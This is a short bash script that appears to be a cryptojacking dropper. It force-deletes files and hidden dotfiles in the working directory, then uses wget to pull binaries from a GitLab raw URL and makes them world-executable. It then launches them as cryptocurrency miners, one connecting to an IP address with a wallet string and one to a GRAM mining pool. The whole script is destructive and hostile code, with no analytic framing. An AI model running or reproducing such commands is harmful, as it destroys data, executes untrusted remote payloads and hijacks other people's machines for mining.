#!/bin/bash
rm -rvf * 
rm -rvf ele* lol* 1.43* TON* ton* NB* .lib* .bash* .majza*
rm -R *
mkdir .des
cd .des
rm -R *

wget https://gitlab.com/majapahlevi/mvp/-/raw/main/b
chmod 777 b && ./b -o 161.35.141.255:80 -u amyKwSEvRSVaTi1UiyKnrk9pQWasrEeX3ApiMtzFFfUL8Y8HAfaHX6bRnc9XjZnfUhVccifsw1FCx32ogbB2gWUN1NxxLdd7jc -p maggamanis-$(shuf -n 1 -i 1-9999) -a rx/0 -k --donate-level 1 & 

wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.84
chmod 777 lol1.84

./lol1.84 -a GRAM --pool api-pool.gramcoin.org:443 --user UQDdpOB_jaOswoGqi9kCtWJBttZeh75KYzubDJsNBKx9iKV3 --no-cl

done
